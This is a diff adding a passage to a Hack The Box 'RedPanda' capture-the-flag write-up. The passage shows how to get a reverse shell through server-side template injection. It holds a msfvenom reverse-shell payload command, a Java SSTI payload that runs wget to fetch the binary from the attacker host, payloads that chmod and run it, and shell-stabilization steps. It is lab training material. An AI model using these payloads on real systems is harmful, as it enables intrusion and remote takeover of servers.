@@ -179,7 +179,96 @@ Lets see what happens when we use this
 
 cool cool, our arithmetic got executed actually.
 
-Now, lets look for a payload that can help us execute system commands
+Now, lets look for a payload that can help us spawn a reverse shell
+
+We'll start out by generating a malicious ```.elf``` file
+
+command:```msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1234 -f elf > bankai.elf```
+
+Ensure your provide your ```LHOST``` and ```LPORT```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/redpanda]
+└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.61 LPORT=1234 -f elf > bankai.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf file: 194 bytes
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/redpanda]
+└─$ ls -la
+total 20
+drwxr-xr-x  2 bl4ck4non bl4ck4non 4096 Oct 23 23:00 .
+drwxr-xr-x 21 bl4ck4non bl4ck4non 4096 Oct 23 22:02 ..
+-rw-r--r--  1 bl4ck4non bl4ck4non  194 Oct 23 23:01 bankai.elf
+```
+smooth, what we'll do next is start a simple Http server in this directory
+
+command:```python3 -m http.server 80```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f6a6c21c-e274-44c0-b6ac-0af6175b78ea)
+
+On the target's website, we'll try to get the ```bankai.elf``` file using the ssti payload below
+
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://LHOST/bankai.elf")}
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef708a36-ffdb-46fb-8d6b-53c74cd4768c)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/81819ef8-7598-4ae8-a529-7fe1748e1b2b)
+
+Checking the python3 server we set up
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/09aeb8a8-f3ff-4199-8059-4c2db94ccf34)
+
+nice nice, it got the file
+
+On the target's website, e can give the executable permission using the ssti payload below
+
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./bankai.elf")}
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e8eb4a9-9f00-43dd-b0bc-8d9c59e568a8)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/13c7cc1c-e03b-4500-a39d-3803bf07d7d6)
+
+Nice, there was no error.
+
+Now, before we execute the executable file we sent, ensure you set up your netcat listener
+
+To execute the "bankai.elf" file on the target's website we can use the ssti payload below
+
+```
+*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./bankai.elf")}
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5a76ae5a-febc-405a-8455-03a69b6ebaa4)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e8da895-b3c8-450b-90ff-17f32fc2b8e9)
+
+Checking the netcat listener we set up
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6866a3fc-2c41-4eda-bba9-3524c52e16af)
+
+We spawned a shell hehe
+
+To stabilize this shell
+
+```
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+ctrl + z (to background)
+stty raw -echo && fg
+export TERM=xterm
+```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bdaee41c-0c20-4195-9c44-f08769398d26)
+
+Lets go ahead to escalate our privileges
+
+
+
+# Privilege Escalation
+
 
 
 
